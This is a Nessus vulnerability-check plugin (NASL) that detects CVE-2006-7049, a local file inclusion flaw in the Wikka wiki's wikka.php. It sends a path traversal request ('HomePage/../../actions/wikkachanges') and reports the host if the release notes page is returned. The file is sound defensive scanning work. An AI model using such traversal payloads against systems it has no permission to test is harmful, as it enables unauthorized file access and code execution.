#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(21729);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2006-7049");
  script_bugtraq_id(18484);
  script_xref(name:"OSVDB", value:"26543");

  script_name(english:"Wikka wikka.php Local File Inclusion");
  script_summary(english:"Tries to read a local file in Wikka");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
local file include issue." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Wikka, a lightweight, open-source wiki
application written in PHP. 

The version of Wikka installed on the remote host has a programming
error in the 'Method()-method' in 'wikka.php'.  By leveraging this
issue, an unauthenticated attacker may be able to access arbitrary PHP
files on the affected host and execute them, subject to the privileges
of the web server user id. 

Note that successful exploitation is unaffected by the setting of PHP
'register_globals' but only works with files with the extension
'.php'." );
 script_set_attribute(attribute:"see_also", value:"http://wush.net/trac/wikka/ticket/36" );
 script_set_attribute(attribute:"see_also", value:"http://wikkawiki.org/WikkaReleaseNotes#hn_Wikka_1.1.6.2" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Wikka version 1.1.6.2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/wikka", "/wiki", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  req = http_get(
    item:string(
      dir, "/wikka.php?",
      "wakka=HomePage/../../actions/wikkachanges"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # There's a problem if we see the release notes.
  if ("<h2>Wikka Release Notes</h2>" >< res) {
    security_hole(port);
    exit(0);
  }
}
